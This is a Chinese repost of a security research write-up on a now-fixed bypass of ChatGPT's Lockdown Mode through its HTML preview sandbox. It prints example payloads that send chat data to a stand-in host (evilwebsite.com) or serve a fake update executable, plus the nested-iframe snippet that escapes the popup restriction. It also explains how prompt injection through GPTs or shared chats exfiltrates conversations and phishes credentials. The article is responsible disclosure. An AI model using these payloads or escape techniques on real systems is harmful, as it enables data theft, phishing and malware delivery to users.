---
title: ChatGPT 锁定模式绕过：网络钓鱼、恶意软件投递与静默数据泄露
url: https://mp.weixin.qq.com/s/SHFsjPqIDB_5yzS33ir3vQ
source: Doonsec's feed
date: 2026-11-18
fetch_date: 2026-11-19T09:44:17.085387
---

# ChatGPT 锁定模式绕过：网络钓鱼、恶意软件投递与静默数据泄露

# ChatGPT 锁定模式绕过：网络钓鱼、恶意软件投递与静默数据泄露

原创

CheckPoint
CheckPoint

安全行者老霍

![]()

在小说阅读器读本章

去阅读

![]()

在公众号小说中沉浸阅读

**作者：Alexey Bukhteyev**

发布时间：2026年11月5日

**核心要点**

* OpenAI 近期推出了“锁定模式”（Lockdown Mode），这是一项可选的高级安全设置，旨在保护敏感用户数据免受基于提示词注入（prompt injection）的数据泄露攻击。
* Check Point Research 发现了一个允许攻击者绕过锁定模式的漏洞，使其核心防护机制失效。
* 该漏洞暴露了广泛的攻击面，能够实现整个聊天记录的静默泄露、通过网络钓鱼窃取凭据以及恶意软件投递。
* 在 ChatGPT Classic 中，该攻击无需任何用户交互：仅仅进行一次对话就足以触发静默数据泄露。

**1. 引言**

今年早些时候，Check Point Research 披露了 ChatGPT 代码执行运行时中的一个安全缺陷，该缺陷允许敏感对话数据通过 DNS 隧道（DNS tunneling，一种绕过运行时网络隔离的隐蔽出站通道）静默泄露到攻击者控制的服务器。该问题的修复程序随后得到了及时部署。

此后，OpenAI 推出了一项新的安全功能：锁定模式（Lockdown Mode）。

锁定模式是面向已登录 ChatGPT 用户的可选高级安全设置。其目的是降低提示词注入攻击通过诱使 ChatGPT 或其某个工具发出出站 Web、应用、连接器或文件下载请求来泄露敏感数据的风险。OpenAI 自己关于 URL 安全性的文章中描述了一个经典例子：攻击者诱骗 AI 加载类似 `attacker.example/collect?data=<private data>`的链接--即使聊天界面中从未出现任何可疑内容，私人数据最终也会出现在攻击者的服务器日志中。

认识到无论部署何种护栏（guardrails），提示词注入始终是一个持续存在的风险，锁定模式通过切断数据离开对话的通道来缓解这一风险。启用后，它会将实时 Web 访问限制为缓存内容，阻止从互联网加载和显示图像，禁用 Canvas 生成代码的网络请求，并关闭深度研究（Deep Research）、智能体模式（Agent Mode）、实时连接器和文件下载。

我们在 ChatGPT 中发现了一个漏洞，允许攻击者绕过锁定模式并将聊天数据隐蔽地泄露到外部服务器。

![](https://mmbiz.qpic.cn/mmbiz_png/MRb1xuqfia3m0sj6T7hTxibUOia9mP3yaNk541lfVcamc9BiazjYcN87U2iaXBCMIMRqUcybAqTHxQsPkIPpAmYa2sKPEncnfXTNhOeLia8FvsDhE/640?wx_fmt=png&from=appmsg)

https://research.checkpoint.com/wp-content/uploads/2026/10/1-noclick-leakage-lockdown-mode.mp4

视频 1 – 整个聊天记录在没有任何通知的情况下被传输到第三方服务器，绕过了锁定模式。

涉及此漏洞的潜在攻击场景并不局限于聊天数据泄露。该漏洞允许操纵 ChatGPT Classic 界面，包括显示包含任意内容的弹出窗口，从而为广泛的网络钓鱼攻击打开了大门。

该攻击可以通过多种方式实施：通过恶意提示词、恶意 GPT 或共享聊天。

以下部分将介绍该漏洞背后的技术细节，并逐步演示可能的利用场景。

**2. 技术细节**

2026年2月，OpenAI 在 ChatGPT 代码块中添加了 HTML 页面预览功能。其外观如下所示：

![](https://mmbiz.qpic.cn/mmbiz_png/MRb1xuqfia3ny2f04KkiabUdkzC9SL8FibfHzFcEVNVqQFqibQVHeAEdXa0o7e26KmCjNDRt4FSoTkJorsQRmt3ye7eGG3qxGbaEkZNDzOe87C4/640?wx_fmt=png&from=appmsg)

图 1 – ChatGPT 中的 HTML 页面预览。

当然，围绕此功能包含多项安全防护措施，因为否则在 ChatGPT 界面内渲染带有 JavaScript 的用户可控 HTML 可能会为私人数据泄露创造直接路径。

最明显的攻击场景包括：

* 嵌入一个 URL 中包含聊天数据的外部图像：

  `<img src="[https://evilwebsite.com/?q=personal_data](https://evilwebsite.com/?q=personal_data)" />`如果此类图像能够被渲染，攻击者就可以触发私人数据的零点击（zero-click）泄露。
* 嵌入一个外部链接：`<a href="[https://evilwebsite.com/malware.exe](https://evilwebsite.com/malware.exe)">Download ChatGPT update</a>`这将允许攻击者直接在 ChatGPT 界面内放置极具说服力的社会工程学诱饵，并通过共享聊天进行分发。
* 打开一个具有任意 URL 的弹出窗口，既可以通过带有 `target="_blank"`指令的链接实现：

  <a href="[https://evilwebsite.com/](https://evilwebsite.com/)" target="\_blank">Click me</a>

也可以通过 JavaScript 实现：

`window.open("[https://evilwebsite.com/](https://evilwebsite.com/)", "_blank", "width=380,height=260");`这种场景在 ChatGPT Classic 客户端中尤为危险，因为用户可能会将该弹出窗口视为受信任应用程序上下文的一部分。

* 读取 `chatgpt.com`的 cookie 或 `localStorage`数据。这将带来会话劫持（session-compromise）风险。

这些场景通过多层隔离和运行时强制执行得到了有效缓解。

渲染的 HTML 被放置在沙箱（sandbox）内，将用户可控内容与主 ChatGPT 应用程序上下文分离开来，从而防止渲染的页面直接访问父文档、ChatGPT UI 状态、cookie 或与 `chatgpt.com`关联的 `localStorage`。

页面向外部资源发送数据、加载远程图像、脚本、链接或打开任意外部 URL 的所有尝试都会被沙箱拦截，并以警告形式呈现：

![](https://mmbiz.qpic.cn/mmbiz_png/MRb1xuqfia3liaq74ibxiboDiaZ9dHXbKPpibwJX8YVnabKPicOwtkhN7bnfZbt76YY5IozsG66fEyJqulEeRNvCsAClT7O9ibazTUE8n4jnZ83O0Zs/640?wx_fmt=png&from=appmsg)

图 2 – 当渲染的 HTML 页面尝试访问外部资源或用户点击外部链接时，ChatGPT 会显示审批对话框。

该沙箱是在两个嵌套的 iframe 中实现的。如果我们查看其实现方式，会发现沙箱并未限制 iframe 中的某些操作。例如，`allow-popups`和 `allow-popups-to-escape-sandbox`权限处于启用状态。

![](https://mmbiz.qpic.cn/mmbiz_png/MRb1xuqfia3n4R2sN2jfJ5yZYeD6RdF9bEFy20VAOzUSDLWIrROObtT4byOmpsicaqwUU1DMV74PNa6BXHCs34aicyhzMAwjH8tMLG2UzIkDEg/640?wx_fmt=png&from=appmsg)

图 3 – HTML 预览 iframe 的沙箱属性，显示了宽松的弹窗令牌（高亮部分）。

弹出窗口是通过另一种方式控制的。沙箱脚本重新定义了 `window.open`函数：`window.open: h=>{if(!h)return null;const{location:f}=r;return an(o,f,h),null}`

正因如此，当 iframe 中显示的网页尝试打开弹出窗口时，ChatGPT 在获得用户批准之前不会允许此操作。当页面尝试使用空 URL 或 `about:blank`打开弹出窗口时，该函数仅返回 `null`，用户甚至不会看到任何通知。

然而，弹出窗口并未受到 iframe 沙箱的明确限制，因为它具有 `allow-popups`令牌。

因此，如果我们能够获取一个真正的 `window.open`函数，我们就能够打开弹出窗口，从而绕过 HTML 沙箱限制，甚至绕过锁定模式。事实上，我们可以在沙箱页面内部再创建一个嵌套的 iframe，并使用其 `contentWindow.open`函数： `window.open("about:blank"); // 被阻止``// 创建一个嵌套的 iframe``var f = document.createElement('iframe');document.body.appendChild(f);f.contentWindow.open("about:blank"); // 生效`

此外，在成功打开弹出窗口后，攻击者可以在其中放入任意 HTML 代码，由于存在 `allow-popups-to-escape-sandbox`令牌，这些代码将不再在沙箱中执行。

**3. 攻击面：受信任界面中的数据泄露、网络钓鱼与恶意软件下载**

该漏洞打开了广泛的攻击面。它能够实现整个聊天记录和上传文件的隐蔽窃取、伪装成合法更新的恶意软件分发，甚至凭据窃取。下面，我们将逐步介绍几种场景并解释每种场景的工作原理。

**通过伪造的应用程序窗口投递恶意软件**通常，默认浏览器设置会阻止 JavaScript 打开弹出窗口。打开新窗口通常需要明确的用户操作，例如点击链接或按钮。

攻击者需要部署一个看似合理的诱饵，诱骗用户点击生成的预览。由于攻击者控制着生成页面的内容，制作极具说服力的诱饵非常简单。打开的窗口将保留 ChatGPT 应用程序的图标，而标题则由攻击者控制，从而给用户造成仍在与 ChatGPT 应用程序交互的错觉。例如，这可用于诱骗用户下载伪装成应用程序更新的恶意软件。ChatGPT Classic 应用程序不允许自动下载文件，因此要下载文件，用户必须额外点击该链接。

![](https://mmbiz.qpic.cn/sz_mmbiz_png/MRb1xuqfia3m1X0M0pRn7UkyiaA5yZDkuyEyDv8w2iaIUKSGjS8csRwKicFZX1PYibrFbxB53f9uLSiaL7cVYLP02PEgib87ibiaBFf9WJ1zlWvxMlqM/640?wx_fmt=png&from=appmsg)

https://research.checkpoint.com/wp-content/uploads/2026/10/3-file-download-in-app.mp4

视频 2 – 通过伪造的 ChatGPT 窗口投递恶意软件。

这种场景在浏览器中更容易实施，因为浏览器不会阻止自动下载。此外，受害者甚至不需要拥有账户，攻击者只需分享一个包含恶意页面的聊天记录，这使得点击共享聊天中的任何内容都变得十分危险：

https://research.checkpoint.com/wp-content/uploads/2026/10/4-demo-file-donwload-shared-chat.mp4

![](https://mmbiz.qpic.cn/mmbiz_png/MRb1xuqfia3nq7iaBuaMF9t1cib86ialq2T8mOVWRUYd9mPlfQCIcswqrgjlGdiaLofU0MhqqZs8B0ic936Rf7GJASNI20RqczYWj8hgQlmC7naCM/640?wx_fmt=png&from=appmsg)

视频 3 – 通过共享聊天投递恶意软件。

**4. ChatGPT Classic 中的零点击利用**

我们发现，基于 Electron 的 ChatGPT Classic 应用程序中的 `window.open`即使在没有用户手势操作的情况下也能正常工作。这使得该漏洞变得危险得多：攻击者无需用户进行任何交互即可静默泄露数据，仅仅进行一次对话就足以触发攻击。视频 1 演示了这一点，其中一个恶意 GPT 将聊天消息静默泄露到攻击者控制的服务器。

除此之外，我们还发现可以在主 ChatGPT 应用程序窗口中重新加载内容并代表用户执行某些操作，例如强制其退出账户。这可能允许攻击者制作极具说服力的诱饵，诱骗用户在攻击者控制的页面上重新进行身份验证，从而静默窃取其凭据。

https://research.checkpoint.com/wp-content/uploads/2026/10/2-password-phishing-1.mp4

![](https://mmbiz.qpic.cn/sz_mmbiz_png/MRb1xuqfia3nkThIicD1FpOesRbQUR6cBGXa9gNQ1VSO1bNsuia4HicSDibke2BLWA1GMXVVSqbWJxaUscYSUYn3Ju0NQxwfSKUDLLACq5jAjWk4/640?wx_fmt=png&from=appmsg)

视频 4 – 凭据窃取。

**5. 结论**

Check Point Research 负责任地向 OpenAI 披露了此漏洞。2026年9月18日，OpenAI 通知我们已通过从外部 HTML 预览沙箱 iframe 中移除 `allow-popups`和 `allow-popups-to-escape-sandbox`权限部署了修复程序。我们随后对该问题进行了重新测试，并确认本文中描述的利用技术已不再有效。

随着 AI 助手演变为完整的执行环境--在云端运行代码并在客户端渲染内容，同时处理医疗记录、财务数据和其他高度敏感的信息--每一项新功能都在扩大攻击面，包括纯为便利而构建的功能。

AI 智能体和应用程序的护栏及内置安全功能有助于缓解威胁，但它们仍然无法提供绝对的安全保障。在将敏感信息托付给 AI 或授予其对计算机的完全访问权限之前，这一点值得牢记。保护这些系统需要超越单个功能，从整体上审视整个平台。现代 AI 助手带来的益处是巨大的，但安全地采用它们需要密切关注每一个层面，包括用户从未留意过的层面。

https://research.checkpoint.com/2026/chatgpt-lockdown-mode-bypass-phishing-malware-delivery-and-silent-data-exfiltration/

（完）

预览时标签不可点

不喜欢

![]()

微信扫一扫
关注该公众号

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/mmbiz_png/MRb1xuqfia3mxGyRTtp9WicNzJP6hBHDm61klAPjh5XceHltcPKU9vqHD0uIwnKQBp4sonrwB0AHWaQwm07iajCtL5kZKUo7oXX3vs0jwiaHqnE/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
推荐
，轻点两下取消推荐
分享
留言
收藏
听过